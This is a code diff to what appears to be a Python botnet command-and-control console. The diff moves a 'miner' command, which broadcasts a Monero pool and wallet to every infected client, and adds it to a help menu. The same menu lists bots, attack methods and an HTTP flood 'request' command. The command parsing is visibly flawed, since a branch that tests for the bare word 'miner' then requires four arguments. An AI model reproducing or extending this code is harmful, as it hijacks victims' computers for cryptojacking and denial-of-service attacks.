@@ -48,6 +48,7 @@ help_menu = """\033[90m
   -/-\033[35m help \033[90m      -/-
   -/-\033[35m bots \033[90m      -/-
   -/-\033[35m clear \033[90m     -/-
+  -/-\033[35m miner \033[90m     -/-
   -/-\033[35m methods \033[90m   -/-
   -/-\033[35m connect \033[90m   -/-
   -/-\033[35m disconnect \033[90m-/-
@@ -150,6 +151,13 @@ def server():
                     elif console == "clear":
                         clear()
 
+                    elif console == "miner":
+                        if len(console.split()) == 4:
+                            for client in clients:
+                                client.sendall(console.encode())
+                        else:
+                            print("Usage: miner <pool:port> <monero_wallet> <worker_name>")
+
                     elif console == "methods":
                         print(methods)
 
@@ -173,13 +181,6 @@ def server():
                                 client.sendall(console.encode())
                         else:
                             print("Usage: request <http(s)://example.com> <threads>\n")
-
-                    elif console == "miner":
-                        if len(console.split()) == 4:
-                            for client in clients:
-                                client.sendall(console.encode())
-                        else:
-                            print("Usage: miner <pool:port> <monero_wallet> <worker_name>")
 
                     elif console == "connect":
                         print("\033[31m[-]\033[0m You are already connected\n")
